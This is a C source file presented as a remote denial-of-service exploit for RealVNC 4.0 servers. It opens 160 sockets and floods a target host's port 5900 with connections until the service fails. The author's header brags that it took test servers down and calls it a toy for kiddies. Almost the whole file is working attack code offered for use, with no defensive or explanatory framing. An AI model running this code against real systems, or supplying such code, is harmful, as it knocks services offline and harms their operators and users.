/****************************************************************************
 *                                                                          *
 *               RealVNC 4.0 remote ddos Exploit                            *
 *                                                                          *
 *  This is a stupid bug and stupid exploit. and this toy for kiddies       *
 * Tested agains Windows XP,2000 and 98. it works well and the test servers *
 * are down with an ADSL Router heheh :p    have fun..                      *
 * Anyway what can i say more...                                            *
 * Gr33t1ngz: N4rK07IX, blueStar, L4M3R.                                    *
 *                                                                          *
 *                            Code by Uz4yh4N <Lord@Linuxmail.org>          *
 *                                                                          *
 ****************************************************************************/



#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define PORT 5900
#define TIMES 160

main(int argc, char *argv[])
{
    int sockfd[TIMES+5],i;
    struct hostent *he;
    struct sockaddr_in servaddr;



    if(argc != 2) {
      fprintf(stdout, "\n Usage: %s hostname/ip \n\n",argv[0]);
      exit(-1);
    }
    if ((he=gethostbyname(argv[1])) == NULL) {
            perror("gethostbyname");
            exit(-1);
        }

    for(i=0;i<TIMES;++i) {

      if((sockfd[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
         perror("socket");
            exit(-1);
      }
    }

 servaddr.sin_family = AF_INET;
 servaddr.sin_port = htons(PORT);
 servaddr.sin_addr = *((struct in_addr *)he->h_addr);
 memset(&(servaddr.sin_zero), '\0', 8);

 fprintf(stderr, "[+] Trying...\n");

  for(i=0;i<TIMES;++i) {

    if(connect(sockfd[i], (struct sockaddr *)&servaddr, sizeof(struct sockaddr)) == -1) {
          fprintf(stderr, "[+] The target must be down..\n");
          goto done;
        }

 }

 done:
  for(i=i;i>0;i--)
    close(sockfd[i]);

  fprintf(stdout, "[+] Done..\n");

  return 0;

}
